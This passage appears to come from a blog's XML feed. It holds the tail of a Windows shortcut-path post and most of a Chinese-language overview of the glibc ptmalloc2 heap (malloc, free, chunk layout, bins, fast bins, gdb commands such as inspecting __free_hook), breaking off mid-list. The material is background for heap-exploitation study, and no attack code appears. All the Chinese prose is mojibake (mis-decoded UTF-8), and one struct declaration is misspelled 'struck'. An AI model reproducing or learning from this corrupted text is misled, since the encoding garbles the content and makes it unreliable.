å¿«æ·æ–¹å¼ï¼Œå³é”®æŸ¥çœ‹å±æ€§å°±ä¼šå‘ç°åœ¨å±æ€§ä¸­ï¼Œâ€ç›®æ ‡â€œæ é‡Œè¿˜æ˜¯ä¹‹å‰çš„è·¯å¾„ï¼Œæˆ‘ä»¬ä¿®æ”¹å®ƒåˆ°ç§»åŠ¨åçš„è·¯å¾„å³å¯ã€‚</p><p><img src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_11-47-13.png"></p>]]></content>
    
    
    <categories>
      
      <category>è¸©å‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å †æ¦‚è¿°</title>
    <link href="/2023/07/19/%E5%A0%86%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/07/19/%E5%A0%86%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<p>å †çš„ä¸€äº›åŸºç¡€çŸ¥è¯†ğŸ¤ª</p><span id="more"></span><h1 id="ä»€ä¹ˆæ˜¯å †"><a href="#ä»€ä¹ˆæ˜¯å †" class="headerlink" title="ä»€ä¹ˆæ˜¯å †"></a>ä»€ä¹ˆæ˜¯å †</h1><p>å †å®é™…ä¸Šå°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œå®ƒç”±ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘ç”Ÿé•¿ã€‚åœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œå †å¯ä»¥æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜ã€‚</p><p>ä½ å¯ä»¥æŠŠå®ƒçœ‹æˆä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæ•°ç»„é‡Œæ¯ä¸ªå…ƒç´ éƒ½ä¼šå¼€è¾Ÿä¸€å—å†…å­˜æ¥å­˜å‚¨æ•°æ®ï¼Œè¿™å—ç”¨æ¥å­˜å‚¨æ•°æ®çš„å†…å­˜å°±æ˜¯å †ã€‚ç»“æ„ä½“æ•°ç»„åœ¨BSSæ®µä¸Šï¼Œå…¶å†…å®¹å°±æ˜¯å †çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯å †çš„æŒ‡é’ˆã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œå’Œå †æœ‰å…³çš„éƒ¨åˆ†è¢«åˆ’åˆ†ä¸ºäº†2å—ï¼Œå³ç®¡ç†åŒºå—å’Œæ•°æ®å­˜æ”¾åŒºå—ã€‚æ•°æ®å­˜æ”¾åŒºå—å°±æ˜¯å †ï¼Œç®¡ç†åŒºå—å¯ä»¥å¯¹å †å¢åˆ æ”¹æŸ¥ï¼Œä¹Ÿå°±æ˜¯å †ç®¡ç†å™¨ã€‚</p><p>æˆ‘ä»¬ä¸€èˆ¬ç§°ç®¡ç†å †çš„é‚£éƒ¨åˆ†ç¨‹åºä¸ºå †ç®¡ç†å™¨ã€‚å †ç®¡ç†å™¨å¤„äºç”¨æˆ·ç¨‹åºä¸å†…æ ¸ä¸­é—´ï¼Œä¸»è¦åšä»¥ä¸‹å·¥ä½œï¼š</p><ul><li><p>å“åº”ç”¨æˆ·çš„ç”³è¯·å†…å­˜è¯·æ±‚ï¼Œå‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œç„¶åå°†å…¶è¿”å›ç»™ç”¨æˆ·ç¨‹åºã€‚</p><p>ä¸ºäº†ä¿æŒå†…å­˜ç®¡ç†çš„é«˜æ•ˆæ€§ï¼Œå†…æ ¸ä¸€èˆ¬éƒ½ä¼šé¢„å…ˆåˆ†é…å¾ˆå¤§çš„ä¸€å—è¿ç»­çš„å†…å­˜ï¼Œç”±å†…å­˜ç®¡ç†å™¨æ¥é€šè¿‡è¿‡æŸç§ç®—æ³•ç®¡ç†è¿™å—å†…å­˜ã€‚åªæœ‰è¿™å—å †ç©ºé—´ä¸è¶³æ—¶ï¼Œå †ç®¡ç†å™¨æ‰ä¼šå†æ¬¡ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚</p></li><li><p>ç®¡ç†ç”¨æˆ·æ‰€é‡Šæ”¾çš„å†…å­˜ã€‚</p><p>ç”¨æˆ·é‡Šæ”¾çš„å†…å­˜å¹¶ä¸æ˜¯ç›´æ¥è¿”è¿˜ç»™æ“ä½œç³»ç»Ÿçš„ï¼Œè€Œæ˜¯ç”±å †ç®¡ç†å™¨è¿›è¡Œç®¡ç†ã€‚è¿™äº›é‡Šæ”¾çš„å†…å­˜å¯ä»¥æ¥å“åº”ç”¨æˆ·æ–°ç”³è¯·çš„å†…å­˜çš„è¯·æ±‚ã€‚</p></li></ul><blockquote><p>å½“å‰ Linux ä½¿ç”¨çš„å †åˆ†é…å™¨è¢«ç§°ä¸º ptmalloc2ï¼Œåœ¨ glibc ä¸­å®ç°ã€‚</p></blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒLinuxç³»ç»Ÿä¸­ï¼Œ<strong>åªæœ‰å½“çœŸæ­£è®¿é—®ä¸€ä¸ªåœ°å€çš„æ—¶å€™ï¼Œç³»ç»Ÿæ‰ä¼šå»ºç«‹è™šæ‹Ÿé¡µé¢ä¸ç‰©ç†é¡µé¢çš„æ˜ å°„å…³ç³»</strong>ã€‚ ä¹Ÿå°±æ˜¯è¯´è™½ç„¶æ“ä½œç³»ç»Ÿå·²ç»ç»™ç¨‹åºåˆ†é…äº†å¾ˆå¤§çš„ä¸€å—å†…å­˜ï¼Œä½†æ˜¯è¿™å—å†…å­˜å…¶å®åªæ˜¯è™šæ‹Ÿå†…å­˜ã€‚åªæœ‰å½“ç”¨æˆ·ä½¿ç”¨åˆ°ç›¸åº”çš„å†…å­˜æ—¶ï¼Œç³»ç»Ÿæ‰ä¼šçœŸæ­£åˆ†é…ç‰©ç†é¡µé¢ç»™ç”¨æˆ·ä½¿ç”¨ã€‚</p><h1 id="å †çš„åŸºæœ¬æ“ä½œ"><a href="#å †çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="å †çš„åŸºæœ¬æ“ä½œ"></a>å †çš„åŸºæœ¬æ“ä½œ</h1><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">heap   <span class="hljs-comment">#æŸ¥çœ‹å †å—</span><br>bin    <span class="hljs-comment">#æŸ¥çœ‹binåŒºå—</span><br>p &amp;__free_hook <span class="hljs-comment">#æŸ¥çœ‹æŸä¸ªå‡½æ•°çš„çœŸå®åœ°å€</span><br>p *__free_hook <span class="hljs-comment">#æŸ¥çœ‹æŸä¸ªå‡½æ•°çš„æŒ‡å‘</span><br>x/xxgx 0xxxx <span class="hljs-comment">#æŸ¥çœ‹æŸä¸ªåœ°å€çš„å†…å­˜</span><br>vmmap<br></code></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p><code>malloc()</code> æ˜¯åŠ¨æ€å†…å­˜åˆ†é…å‡½æ•°ã€‚å®ƒæ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œå³æ‰€éœ€åˆ†é…çš„å†…å­˜å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼Œå¹¶è¿”å›æŒ‡å‘åˆ†é…å†…å­˜èµ·å§‹ä½ç½®çš„æŒ‡é’ˆã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><ul><li>å¦‚æœ <em>size</em> &#x3D;0ï¼Œå°†è¿”å›å½“å‰ç³»ç»Ÿå…è®¸çš„å †çš„æœ€å°å†…å­˜å—ï¼ˆæœ€å°å€¼ min ä¸º0x20ï¼‰</li><li>å¦‚æœ <em>size</em> ä¸ºè´Ÿæ•°ï¼Œç”±äºå¤§éƒ¨åˆ†çš„ç³»ç»Ÿä¸Š <em>size_t</em> éƒ½æ˜¯æ— ç¬¦å·æ•°ï¼Œæ‰€ä»¥ç¨‹åºå°±ä¼šåˆ†é…å¾ˆå¤§çš„ä¸€å—å†…ä»ç©ºé—´ï¼Œä½†å› ä¸ºç³»ç»Ÿæ²¡æœ‰é‚£ä¹ˆå¤šçš„å†…å­˜å¯ä»¥åˆ†é…ï¼Œé€šå¸¸éƒ½ä¼šåˆ†é…å¤±è´¥ã€‚</li><li>å¦‚æœ malloc() åˆ†é…å¤±è´¥ï¼Œè¿”å›çš„æŒ‡é’ˆå°†ä¸º NULLã€‚</li></ul><blockquote><p>malloc() åˆ†é…çš„å†…å­˜ç©ºé—´åœ¨ä½¿ç”¨å®Œåéœ€è¦æ‰‹åŠ¨é‡Šæ”¾ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼ã€‚</p></blockquote><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><code>free()</code> æ˜¯åŠ¨æ€å†…å­˜åˆ†é…å‡½æ•°ã€‚å®ƒæ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå³è¦é‡Šæ”¾çš„å†…å­˜å—çš„èµ·å§‹åœ°å€ï¼Œæ­¤å‡½æ•°æ²¡æœ‰è¿”å›å€¼ã€‚éœ€è¦é‡Šæ”¾çš„å†…å­˜ç©ºé—´å¯èƒ½ç”± <code>malloc()</code>ã€<code>calloc()</code> æˆ– <code>realloc() </code> åˆ†é…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span>;<br></code></pre></td></tr></table></figure><ul><li>å½“Pä¸ºç©ºæŒ‡é’ˆï¼Œå‡½æ•°å¹¶ä¸ä¼šæ‰§è¡Œä»»ä½•æ“ä½œ</li><li>å½“ p å·²ç»è¢«é‡Šæ”¾ä¹‹åï¼Œå†æ¬¡é‡Šæ”¾ä¼šå‡ºç° <code>double free </code> é”™è¯¯ </li><li>é™¤äº†è¢«ç¦ç”¨ (mallopt) çš„æƒ…å†µï¼Œå¦‚æœæ˜¯é‡Šæ”¾ä¸€å—å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œç¨‹åºä¼šå°†è¿™å—å†…å­˜ç©ºé—´è¿˜ç»™ç³»ç»Ÿï¼Œä»¥ä¾¿å‡å°ç¨‹åºæ‰€ä½¿ç”¨çš„å†…å­˜ç©ºé—´ã€‚</li></ul><h2 id="å¾®è§‚ç»“æ„"><a href="#å¾®è§‚ç»“æ„" class="headerlink" title="å¾®è§‚ç»“æ„"></a>å¾®è§‚ç»“æ„</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>åœ¨ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç§°ç”± malloc ç”³è¯·çš„å†…å­˜ä¸º chunk ã€‚è¿™å—å†…å­˜åœ¨ ptmalloc2 å†…éƒ¨ç”¨ <code>malloc_chunk</code> ç»“æ„ä½“æ¥è¡¨ç¤ºã€‚å½“ç¨‹åºç”³è¯·çš„ chunk è¢« free åï¼Œä¼šè¢«åŠ å…¥åˆ°ç›¸åº”çš„ç©ºé—²ç®¡ç†åˆ—è¡¨ä¸­ã€‚</p><p>æ— è®ºchunkçš„å¤§å°å¦‚ä½•ï¼Œå¤„äºåˆ†é…çŠ¶æ€è¿˜æ˜¯é‡Šæ”¾çŠ¶æ€ï¼Œå®ƒä»¬éƒ½ä½¿ç”¨ä¸€ä¸ªç»Ÿä¸€çš„ç»“æ„ã€‚ä½†æ˜¯æ ¹æ®æ˜¯å¦è¢«é‡Šæ”¾ï¼Œä¸åŒçš„chunkçš„è¡¨ç°å½¢å¼ä¼šæœ‰æ‰€ä¸åŒã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">struck malloc_chunk&#123;<br>    INTERNAL_SIZE_T prev_size;<br>    INTERNAL_SIZE_T size;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><strong>prev_size</strong> ï¼šè®°å½•å‰ä¸€ä¸ªè¾ƒä½åœ°å€çš„ç©ºé—²çš„ chunk çš„å¤§å°ï¼ˆåŒ…æ‹¬chunkå¤´ï¼‰</p><p>å½“ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€æ—¶ï¼Œå®ƒçš„ä¸‹ä¸€ä¸ª chunk çš„ prev_size åŸŸæ— æ•ˆï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ª chunk çš„è¯¥éƒ¨åˆ†ä¹Ÿå¯ä»¥è¢«å½“å‰ chunk ä½¿ç”¨ï¼Œå¹¶å°†å…¶ç”¨äºæ‰©å±•å½“å‰å†…å­˜å—çš„å¯ç”¨ç©ºé—´ã€‚è¿™å°±æ˜¯ chunk ä¸­çš„ç©ºé—´å¤ç”¨ã€‚</p></li><li><p><strong>size</strong> ï¼šè®°å½•çš„æ˜¯å½“å‰ chunk çš„å¤§å°ï¼Œä¸” <strong>size çš„å¤§å°å¿…é¡»æ˜¯ 2 * SIZE_SZ çš„æ•´æ•°å€</strong>ï¼ˆ32 ä½ç³»ç»Ÿä¸­ï¼Œ<em>SIZE_SZ</em> æ˜¯ 4ï¼›64 ä½ç³»ç»Ÿä¸­ï¼Œ<em>SIZE_SZ</em> æ˜¯ 8ï¼‰ã€‚</p><p>å¦‚æœç”³è¯·çš„å†…å­˜å¤§å°ä¸æ˜¯ <code>2 * SIZE_SZ</code> çš„æ•´æ•°å€ï¼Œä¼šè¢«è½¬æ¢æ»¡è¶³å¤§å°çš„æœ€å°çš„ <code>2 * SIZE_SZ</code> çš„å€æ•°ã€‚</p><p>è¯¥å­—æ®µçš„ä½ä¸‰ä¸ªæ¯”ç‰¹ä½å¯¹ chunk çš„å¤§å°æ²¡æœ‰å½±å“ï¼Œå®ƒä»¬ä»é«˜åˆ°ä½åˆ†åˆ«è¡¨ç¤ºï¼š</p><ul><li><p><strong>NON_MAIN_ARENA</strong>ï¼šè®°å½•å½“å‰ chunk æ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹ï¼Œ1 è¡¨ç¤ºä¸å±äºï¼Œ0 è¡¨ç¤ºå±äº</p></li><li><p><strong>IS_MAPPED</strong>ï¼šè®°å½•å½“å‰ chunk æ˜¯å¦æ˜¯ç”± mmap åˆ†é…çš„ã€‚</p></li><li><p><strong>PREV_INUSE</strong>ï¼šè®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª chunk çš„ size çš„ P ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ <em>prev_size</em> å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—² chunk ä¹‹é—´çš„åˆå¹¶ã€‚</p></li></ul></li></ul><blockquote><p>ç‰©ç†ç›¸é‚»çš„ä¸¤ä¸ªç©ºé—² chunk ä¼šè¢«åˆå¹¶ä¸ºä¸€ä¸ª chunk ã€‚å †ç®¡ç†å™¨ä¼šé€šè¿‡ prev_size å­—æ®µä»¥åŠ size å­—æ®µåˆå¹¶ä¸¤ä¸ªç‰©ç†ç›¸é‚»çš„ç©ºé—² chunk å—ã€‚</p></blockquote><ul><li><p><strong>fdï¼Œbk</strong> ï¼šä¸¤ä¸ªæŒ‡é’ˆå˜é‡ï¼Œç”¨äºæ„å»ºåŒå‘é“¾è¡¨ï¼Œåªæœ‰ chunk ç©ºé—²æ—¶æ‰ä¼šè¢«ä½¿ç”¨ã€‚</p><p>å †ç®¡ç†å™¨ä¼šå°†å…¶æ·»åŠ åˆ°é€‚å½“çš„ç©ºé—²å†…å­˜å—é“¾è¡¨ä¸­ç»Ÿä¸€ç®¡ç†ã€‚åœ¨é“¾è¡¨ä¸­ï¼Œæ¯ä¸ªç©ºé—²å†…å­˜å—éƒ½ä¼šæœ‰æŒ‡å‘å‰ä¸€ä¸ªå†…å­˜å—å’Œåä¸€ä¸ªå†…å­˜å—çš„æŒ‡é’ˆã€‚</p><ul><li><strong>fd</strong> ï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk</li><li><strong>bk</strong> ï¼šæŒ‡å‘ä¸Šä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk</li></ul></li><li><p><strong>fd_nextsizeï¼Œ bk_nextsize</strong> ï¼šä¸¤ä¸ªæŒ‡é’ˆå˜é‡ï¼Œå’Œ fdï¼Œbk ä½œç”¨ç›¸åŒï¼Œç”¨äºè¾ƒå¤§çš„ chunk ï¼ˆlarge chunkï¼‰ã€‚</p><p>ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†ã€‚</p><ul><li><p><strong>fd_nextsize</strong> ï¼šæŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚</p></li><li><p><strong>bk_nextsize</strong> ï¼šæŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚</p></li></ul></li></ul><blockquote><p>å¦‚æœä¸€ä¸ª chunk å¤„äº free çŠ¶æ€ï¼Œä¼šæœ‰ä¸¤ä¸ªä½ç½®è®°å½•å…¶ç›¸åº”çš„å¤§å°ï¼šæœ¬èº«çš„ size å­—æ®µå’Œå®ƒåä¸€ä¸ª chunk çš„ prev_size å­—æ®µã€‚</p></blockquote><p>å·²ç»è¢«åˆ†é…çš„chunkç»“æ„å¦‚ä¸‹ï¼Œæˆ‘ä»¬ç§°å‰ä¸¤ä¸ªå­—æ®µç§°ä¸º chunk headerï¼Œåé¢çš„éƒ¨åˆ†ç§°ä¸º user dataã€‚æ¯æ¬¡ malloc ç”³è¯·å¾—åˆ°çš„å†…å­˜æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯ mem å…¶å®æŒ‡å‘ user data çš„èµ·å§‹å¤„ï¼ˆè¿™æ‰æ˜¯ç”¨æˆ·çœŸæ­£ç”³è¯·åˆ°çš„å¯åˆ©ç”¨å†…å­˜ï¼‰ï¼š</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/usechunk.png"></p><p>è¢«é‡Šæ”¾çš„ chunk è¢«è®°å½•åœ¨é“¾è¡¨ä¸­ï¼ˆå¯èƒ½æ˜¯å¾ªç¯åŒå‘é“¾è¡¨ï¼Œä¹Ÿå¯èƒ½æ˜¯å•å‘é“¾è¡¨ï¼‰ã€‚å…·ä½“ç»“æ„å¦‚ä¸‹ï¼š<br><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/freechunk.png"></p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>ç”¨æˆ·é‡Šæ”¾æ‰çš„ chunk ä¸ä¼šé©¬ä¸Šå½’è¿˜ç»™ç³»ç»Ÿï¼Œè€Œæ˜¯ç”±å †ç®¡ç†å™¨ç»Ÿä¸€ç®¡ç† heap å’Œ mmap æ˜ å°„åŒºåŸŸä¸­çš„ç©ºé—²çš„ chunkã€‚ç©ºé—²çš„ chunk æˆ‘ä»¬ç§°ä¹‹ä¸º bin ã€‚</p><p>åœ¨å®é™…çš„å®ç°ä¸­ï¼Œå †ç®¡ç†å™¨é‡‡ç”¨åˆ†ç®±å¼æ–¹æ³•å¯¹ç©ºé—²çš„ chunk è¿›è¡Œç®¡ç†ã€‚æ ¹æ®å¤§å°å°† bin åˆ†ä¸º4ç±»ï¼šfast bin , small bin , large bin , unsorted binã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œæ¯ä¸€ç±» bin å½“ä¸­å†…å­˜å¤§å°ç›¸ä¼¼çš„ä¼šç”±åŒå‘é“¾è¡¨é“¾æ¥ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ç±» bin çš„å†…éƒ¨ä»ç„¶ä¼šæœ‰å¤šä¸ªäº’ä¸ç›¸å…³çš„é“¾è¡¨æ¥ä¿å­˜ä¸åŒå¤§å°çš„ chunk ã€‚</p><p>å¯¹äº small binsï¼Œlarge binsï¼Œunsorted bins æ¥è¯´ï¼Œptmalloc å°†å®ƒä»¬ç»´æŠ¤åœ¨åŒä¸€ä¸ªæ•°ç»„ä¸­ã€‚è¿™äº› bin å¯¹åº”çš„æ•°æ®ç»“æ„åœ¨ malloc_state ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS 128</span><br>mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];<br></code></pre></td></tr></table></figure><p><code>bins</code> ä¸»è¦ç”¨äºç´¢å¼•ä¸åŒ bin çš„ fd å’Œ bkã€‚ä»¥ 32 ä½ç³»ç»Ÿä¸ºä¾‹ï¼Œbins å‰ 4 é¡¹çš„å«ä¹‰å¦‚ä¸‹ï¼š</p><table><thead><tr><th>ä¸‹æ ‡</th><th>0</th><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>å«ä¹‰</td><td>bin1 çš„ fd&#x2F;bin2 çš„ prev_size</td><td>bin1 çš„ bk&#x2F;bin2 çš„ size</td><td>bin2 çš„ fd&#x2F;bin3 çš„ prev_size</td><td>bin2 çš„ bk&#x2F;bin3 çš„ size</td></tr></tbody></table><p>å¯ä»¥çœ‹åˆ°ï¼Œbin2 çš„ prev_sizeã€size å’Œ bin1 çš„ fdã€bk æ˜¯é‡åˆçš„ã€‚ç”±äºæˆ‘ä»¬åªä¼šä½¿ç”¨ fd å’Œ bk æ¥ç´¢å¼•é“¾è¡¨ï¼Œæ‰€ä»¥è¯¥é‡åˆéƒ¨åˆ†çš„æ•°æ®å…¶å®è®°å½•çš„æ˜¯ bin1 çš„ fdã€bkã€‚è™½ç„¶åä¸€ä¸ª bin å’Œå‰ä¸€ä¸ª bin å…±ç”¨éƒ¨åˆ†æ•°æ®ï¼Œä½†æ˜¯å…¶å®è®°å½•çš„ä»ç„¶æ˜¯å‰ä¸€ä¸ª bin çš„é“¾è¡¨æ•°æ®ã€‚é€šè¿‡è¿™æ ·çš„å¤ç”¨ï¼Œå¯ä»¥èŠ‚çœç©ºé—´ã€‚</p><p>æ•°ç»„ä¸­çš„ bin ä¾æ¬¡å¦‚ä¸‹ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªæ˜¯ <strong>unsorted bins</strong>ï¼Œè¿™é‡Œé¢çš„binéƒ½æ²¡æœ‰è¿›è¡Œæ’åºï¼Œç›¸å¯¹æ‚ä¹±</li><li>ç´¢å¼•ä» 2 åˆ° 63 çš„ bin ç§°ä¸º <strong>small bin</strong>sã€‚åŒä¸€ä¸ªé“¾è¡¨ä¸­çš„ chunk å¤§å°ç›¸ç­‰ï¼Œä¸¤ä¸ªç›¸é‚»ç´¢å¼•çš„ small bin é“¾è¡¨ä¸­çš„ chunk å¤§å°ç›¸å·®çš„å­—èŠ‚æ•°ä¸º 2 ä¸ªæœºå™¨å­—é•¿ï¼Œå³ 32 ä½ç›¸å·® 8 å­—èŠ‚ï¼Œ64 ä½ç›¸å·® 16 å­—èŠ‚ã€‚</li><li>small bins åé¢çš„ bin è¢«ç§°ä½œ <strong>large bins</strong>ã€‚large bin ä¸­çš„æ¯ä¸€ä¸ª bin éƒ½åŒ…å«ä¸€å®šèŒƒå›´å†…çš„ chunkï¼Œå…¶ä¸­çš„ chunk æŒ‰ fd æŒ‡é’ˆçš„é¡ºåºä»å¤§åˆ°å°æ’åˆ—ã€‚ç›¸åŒå¤§å°çš„ chunk åŒæ ·æŒ‰ç…§æœ€è¿‘ä½¿ç”¨é¡ºåºæ’åˆ—ã€‚</li></ul><h5 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h5><p>æœ‰å¾ˆå¤šçš„ç¨‹åºéƒ½ä¼šç”³è¯·ä»¥åŠé‡Šæ”¾ä¸€äº›å°å†…å­˜å—ï¼Œå¦‚æœå°å†…å­˜å—é‡Šæ”¾ä»¥åå­˜åœ¨ä¸ä¹‹ç›¸é‚»çš„ç©ºé—²çš„ chunk ï¼Œæˆ‘ä»¬å°†å®ƒä»¬è¿›è¡Œåˆå¹¶ï¼Œé‚£ä¹ˆå½“ä¸‹ä¸€æ¬¡å†æ¬¡ç”³è¯·ç›¸åº”å¤§å°çš„ chunk æ—¶ï¼Œå°±éœ€è¦å†æ¬¡å¯¹ chunk è¿›è¡Œåˆ†å‰²ï¼Œè¿™æ ·å°±å¤§å¤§é™ä½äº†å †çš„åˆ©ç”¨æ•ˆç‡ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œptmalloc ä¸­ä¸“é—¨è®¾è®¡äº† <code>fast bin</code>ï¼Œé¡¾åæ€ä¹‰å®ƒç”¨æ¥å¿«é€Ÿåˆ†é…å†…å­˜ã€‚</p><p>å½“ç”¨æˆ·éœ€è¦çš„ chunk çš„å¤§å°å°äº fastbin çš„æœ€å¤§å€¼æ—¶ï¼Œ å †ç®¡ç†å™¨ä¼šé¦–å…ˆåˆ¤æ–­ fastbin ä¸­ç›¸åº”çš„ bin ä¸­æ˜¯å¦æœ‰å¯¹åº”å¤§å°çš„ç©ºé—²å—ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå°±ä¼šç›´æ¥ä»è¿™ä¸ª bin ä¸­è·å– chunkã€‚å¦‚æœæ²¡æœ‰çš„è¯ï¼Œå †ç®¡ç†å™¨æ‰ä¼šè¿›è¡Œæ¥ä¸‹æ¥çš„ä¸€ç³»åˆ—æ“ä½œã€‚</p><blockquote><p>åœ¨32ä½ç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿé»˜è®¤çš„ fast bin å¤§å°ä¸º 64 å­—èŠ‚ï¼Œä½†å®é™…ä¸Šå®ƒå¯ä»¥å¤„ç†æœ€å¤§ 80 å­—èŠ‚çš„æ•°æ®ç©ºé—´ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œfast bin å¯ä»¥æ”¯æŒçš„ bin çš„ä¸ªæ•°ä¸º10ä¸ªï¼Œä»æ•°æ®ç©ºé—´ä¸º 8 å­—èŠ‚å¼€å§‹ä¸€ç›´åˆ° 80 å­—èŠ‚ã€‚</p></blockquote><p>fast bins çš„ç‰¹ç‚¹ï¼š</p><ul><li><p>é‡‡ç”¨<strong>å•å‘é“¾è¡¨</strong>å¯¹å…¶ä¸­çš„æ¯ä¸ª bin 